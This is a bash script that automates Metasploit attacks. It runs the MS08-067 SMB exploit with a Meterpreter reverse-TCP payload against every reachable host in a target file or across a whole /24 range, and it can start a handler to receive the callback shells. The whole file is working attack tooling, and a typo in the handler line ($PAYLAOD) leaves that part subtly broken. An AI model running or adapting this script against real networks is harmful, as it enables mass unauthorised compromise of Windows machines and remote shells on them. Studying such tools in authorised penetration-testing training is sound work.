#!/bin/bash

#### created by @jgaudard
#### for educational use only

#default values set
EXPLOIT="windows/smb/ms08_067_netapi"
PAYLOAD="windows/meterpreter/reverse_tcp"
TARGETFILE="hosts.txt"
LHOST="192.168.1.99"
LPORT="443"
MULTI="False"
PING="/bin/ping -q -c1"
FILE="True"
NET="192.168.1"
STARTRANGE="1"
STOPRANGE="254"

if [ "$1" == "" ]
then
	echo "Usage ./msfcli.sh [options]"
	echo "Use -h or --help for more information"
	exit 0
fi

while [ "$1" != "" ]; do
	case $1 in
		-h|--help)
                	echo "Usage ./msfcli.sh [options]"
                	echo ""
                	echo "-h, --help			you are looking at it"
                	echo "-e, --exploit [EXPLOIT]		set the exploit to use"
                	echo "-p, --payload [PAYLOAD]		set the payload to use"
                	echo "-l, --lhost [LHOST]		set the local host"
                	echo "-t, --targetfile [TARGETFILE]	set to target file"
                	echo "-m, --multi [value]		starts a multi-handler in a new window"
                	echo "				default set to 'False'"
                	echo "-f, --file [value]		uses a list of hosts in a file"
                	echo "				default set to 'True'"
                	echo "-n, --net [xxx.xxx.xxx] 		sets the network for a network"
                	echo "				requires -f False"
                	echo "--default			Set to accept default options"
                	echo ""
                	echo "Examples:"
                	echo "	./msfcli.sh -t hosts.txt -l 192.168.1.100 -m True"
                	                	
                	
                        exit 0
                        ;;
                -e|--exploit)		
                	shift
                	EXPLOIT=$1
                	;;
                -p|--payload)		
                	shift
                        PAYLOAD=$1
                        ;;
                -l|--lhost)
                	shift
                        LHOST=$1
                        ;;
                -t|--targetfile)
                	shift
                	TARGETFILE=$1
                	;;
                -m|--multi)
                	shift
                	MULTI=$1
                	;;
                -f|--file)
                	shift
                	FILE=$1
                	;;
                -n|--net)
                	shift
                	NET=$1
                	;;
                * )
                        break
                        ;;
                esac
                shift
        done
        
        
        # Starts a new terminal running the multi-handler.
        if [ "$MULTI" = "True" ]
        then
        	gnome-terminal -x msfcli exploit/multi/handler payload=$PAYLAOD lhost=$LHOST  lport=$LPORT E &
        	sleep 15
        fi
        
        
        
        # this is the magic
        if [ "$FILE" == "True" ]; then
        	for ip in $(cat $TARGETFILE)
        		do	
        			$PING $ip &>/dev/null  # Checks if the host is online first
        			if [ $? -ne 0 ]; then
        				echo "Host $ip is down"
        			else
        				#if it is, then we exploit it!
        				echo "Using MS08_067 on $ip"
        				msfcli $EXPLOIT PAYLOAD=$PAYLOAD rhost=$ip lhost=$LHOST lport=$LPORT DisablePayloadHandler=true E #&>/dev/null 
        			fi
        		done
        	else
        		for ((octect=$STARTRANGE; octect<=$STOPRANGE; octect++))
        		do	
        			$PING $NET'.'$octect &>/dev/null  # Checks if the host is online first
        			if [ $? -ne 0 ]; then
        				echo "Host $NET.$octect is down"
        			else
        				#if it is, then we exploit it!
        				echo "Using MS08_067 on $NET.$octect"
        				msfcli $EXPLOIT PAYLOAD=$PAYLOAD rhost=$NET'.'$octect lhost=$LHOST lport=$LPORT DisablePayloadHandler=true E #&>/dev/null 
        			fi
        		done
        fi
